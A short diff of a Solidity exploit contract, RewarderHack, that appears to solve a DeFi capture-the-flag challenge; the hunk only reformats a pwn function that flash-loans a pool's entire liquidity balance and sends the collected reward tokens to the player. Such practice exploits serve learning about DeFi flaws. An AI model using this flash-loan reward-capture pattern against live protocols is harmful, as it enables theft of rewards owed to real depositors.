@@ -30,13 +30,8 @@ contract RewarderHack {
     }
 
     function pwn() external {
-        flashLoanerPool.flashLoan(
-            liquidityToken.balanceOf(address(flashLoanerPool))
-        );
-        rewardToken.transfer(
-            payable(player),
-            rewardToken.balanceOf(address(this))
-        );
+        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
+        rewardToken.transfer(payable(player), rewardToken.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(uint256 amount) external {
